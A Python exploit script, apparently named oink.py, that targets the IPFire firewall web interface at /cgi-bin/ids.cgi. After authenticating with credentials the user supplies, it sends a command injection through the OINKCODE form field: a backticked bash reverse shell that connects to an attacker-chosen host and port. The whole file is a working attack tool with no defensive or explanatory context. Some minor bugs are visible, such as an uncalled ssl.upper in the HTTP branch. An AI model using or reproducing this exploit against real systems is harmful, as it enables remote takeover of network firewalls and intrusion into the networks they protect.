import requests 
import sys
import time
from urllib3.exceptions import InsecureRequestWarning
import subprocess
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def help():

    print("[!] How to use")
    print("$ python3 oink.py url RPORT LHOST RPORT")
    print("$ python3 oink.py example.com 444 192.168.10.15 9000")

def clear():
    subprocess.run('clear', shell=True)


if len(sys.argv) != 5:
    help()


else: 
    print("-" * 50)
    ssl = input("SSL Enable? (Y/N): ")
    username = input("Type username: ")
    password = input("Type password: ")

    lhost= sys.argv[3]
    lport = sys.argv[4]

    headers = {'Accept-Encoding': 'gzip, deflate, br','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent': 'IPFIRE Exploit', 'Referer': '{https}}','Upgrade-Insecure-Requests': '1'
    }

    payload = {'ENABLE_SNORT_GREEN':'on','ENABLE_SNORT':'on','RULES':'registered','OINKCODE':f'`bash -i >& /dev/tcp/{lhost}/{lport} 0>&1`','ACTION':'Download new ruleset','ACTION2':'snort'}



    if ssl.upper() == "Y":
        https = f'https://{sys.argv[1]}:{sys.argv[2]}/cgi-bin/ids.cgi'
        headers = {'Accept-Encoding': 'gzip, deflate, br',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent': 'IPFIRE Exploit',
                    'Referer': f'{https}',
                    'Upgrade-Insecure-Requests': '1'
                    }
        auth = requests.get(https,headers=headers,auth=(username,password),verify=False)
        if auth.status_code == 200:
            print("-" * 50)
            print("[!] Authentication successful")
            print("-" * 50)
            print("[*] Trying Exploitation")
            time.sleep(3)
            print("[+] Sending reverse shell verify your listening")
            rev = requests.post(https, headers=headers, data=payload, auth=(username, password), verify=False)
    


        else:
            print("-" * 50)
            print("\033[31m[!] Invalid Credentials\033[m")
            print("-" * 50)

    if ssl.upper == "N":
        http = f'http://{sys.argv[1]}:{sys.argv[2]}/cgi-bin/ids.cgi'
        headers = {'Accept-Encoding': 'gzip, deflate, br',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent': 'IPFIRE Exploit',
                    'Referer': f'{http}',
                    'Upgrade-Insecure-Requests': '1'
                    }
        auth = requests.get(http,headers=headers,auth=(username,password),verify=False)
        if auth.status_code == 200:
            print("-" * 50)
            print("[!] Authentication successful")
            print("[*] Trying EXploitation")
            print("-" * 50)
            print("[+] Sending reverse shell verify your listening")
            rev = requests.post(http, headers=headers, data=payload, auth=(username, password), verify=False)

 






